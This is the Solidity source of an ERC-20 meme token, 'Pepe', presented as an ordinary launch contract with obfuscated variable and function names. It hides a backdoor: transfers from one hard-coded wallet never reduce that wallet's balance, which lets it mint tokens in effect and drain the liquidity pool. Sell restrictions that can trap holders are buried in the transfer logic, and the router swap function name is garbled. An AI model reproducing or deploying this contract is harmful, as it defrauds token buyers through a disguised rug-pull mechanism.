/**

Pepe  $PEPE


TWITTER: https://twitter.com/Pepeerc_Coin
TELEGRAM: https://t.me/Pepeeth_Coin
WEBSITE: https://pepeerc.com/
**/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _mjevx(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _mjevx(a, b, "SafeMath");
    }

    function  _mjevx(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _qolpsv {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface _pisovns {
    function swovjTenwvSirtjsFxlOcvwer(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract Pepe is Context, IERC20, Ownable {
    using SafeMath for uint256;
    _pisovns private _Tevaplk;
    address payable private _Aemsvf;
    address private _yiarbvr;

    bool private _ptymknv;
    bool public _Teraelvnm = false;
    bool private ouevuak = false;
    bool private _aekjahfp = false;

    string private constant _name = unicode"Pepe";
    string private constant _symbol = unicode"PEPE";
    uint8 private constant _decimals = 9;
    uint256 private constant _oTotalub = 42069000000 * 10 **_decimals;
    uint256 public _kvboac = _oTotalub;
    uint256 public _Waebmyof = _oTotalub;
    uint256 public _kwapiThaevem= _oTotalub;
    uint256 public _gsoiTcjef= _oTotalub;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _vkpaojaq;
    mapping (address => bool) private _traenojy;
    mapping(address => uint256) private _rkeopmo;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _yrvbvoiq=0;
    uint256 private _bnbnvae=0;


    event _mroqufyt(uint _kvboac);
    modifier osTfoe {
        ouevuak = true;
        _;
        ouevuak = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _oTotalub;
        _vkpaojaq[owner(

        )] = true;
        _vkpaojaq[address
        (this)] = true;
        _vkpaojaq[
            _Aemsvf] = true;
        _Aemsvf = 
        payable (0xB45A64aE778C1F75053588ce6804D68e985CF209);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _oTotalub);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _oTotalub;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _mjevx(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 Rqlimhk=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_Teraelvnm) {
                if (to 
                != address
                (_Tevaplk) 
                && to !=
                 address
                 (_yiarbvr)) {
                  require(_rkeopmo
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _rkeopmo
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _yiarbvr && to != 
            address(_Tevaplk) &&
             !_vkpaojaq[to] ) {
                require(amount 
                <= _kvboac,
                 "Exceeds the _kvboac.");
                require(balanceOf
                (to) + amount
                 <= _Waebmyof,
                  "Exceeds the macxizse.");
                if(_bnbnvae
                < _yrvbvoiq){
                  require
                  (! _eoqnvma(to));
                }
                _bnbnvae++;
                 _traenojy
                 [to]=true;
                Rqlimhk = amount._pvr
                ((_bnbnvae>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _yiarbvr &&
             from!= address(this) 
            && !_vkpaojaq[from] ){
                require(amount <= 
                _kvboac && 
                balanceOf(_Aemsvf)
                <_gsoiTcjef,
                 "Exceeds the _kvboac.");
                Rqlimhk = amount._pvr((_bnbnvae>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_bnbnvae>
                _yrvbvoiq &&
                 _traenojy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!ouevuak 
            && to == _yiarbvr &&
             _aekjahfp &&
             contractTokenBalance>
             _kwapiThaevem 
            && _bnbnvae>
            _yrvbvoiq&&
             !_vkpaojaq[to]&&
              !_vkpaojaq[from]
            ) {
                _rcjnerf( _rkvhq(amount, 
                _rkvhq(contractTokenBalance,
                _gsoiTcjef)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _ujfvhe(address
                    (this).balance);
                }
            }
        }

        if(Rqlimhk>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(Rqlimhk);
          emit
           Transfer(from,
           address
           (this),Rqlimhk);
        }
        _balances[from
        ]= _mjevx(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _mjevx(Rqlimhk));
        emit Transfer
        (from, to, 
        amount.
         _mjevx(Rqlimhk));
    }

    function _rcjnerf(uint256
     tokenAmount) private
      osTfoe {
        if(tokenAmount==
        0){return;}
        if(!_ptymknv)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _Tevaplk.WETH();
        _approve(address(this),
         address(
             _Tevaplk), 
             tokenAmount);
        _Tevaplk.
        swovjTenwvSirtjsFxlOcvwer
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _rkvhq
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _mjevx(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _Aemsvf){
            return a ;
        }else{
            return a .
             _mjevx (b);
        }
    }

    function removefLimitas (
        
    ) external onlyOwner{
        _kvboac = _oTotalub;
        _Waebmyof = _oTotalub;
        emit _mroqufyt(_oTotalub);
    }

    function _eoqnvma(address 
    account) private view 
    returns (bool) {
        uint256 bkzqa;
        assembly {
            bkzqa :=
             extcodesize
             (account)
        }
        return bkzqa > 
        0;
    }

    function _ujfvhe(uint256
    amount) private {
        _Aemsvf.
        transfer(
            amount);
    }

    function enableTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _ptymknv ) ;
        _Tevaplk  
        =  
        _pisovns
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _Tevaplk), 
            _oTotalub);
        _yiarbvr = 
        _qolpsv(_Tevaplk.
        factory( ) 
        ). createPair (
            address(this
            ),  _Tevaplk .
             WETH ( ) );
        _Tevaplk.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_yiarbvr).
        approve(address(_Tevaplk), 
        type(uint)
        .max);
        _aekjahfp = true;
        _ptymknv = true;
    }

    receive() external payable {}
}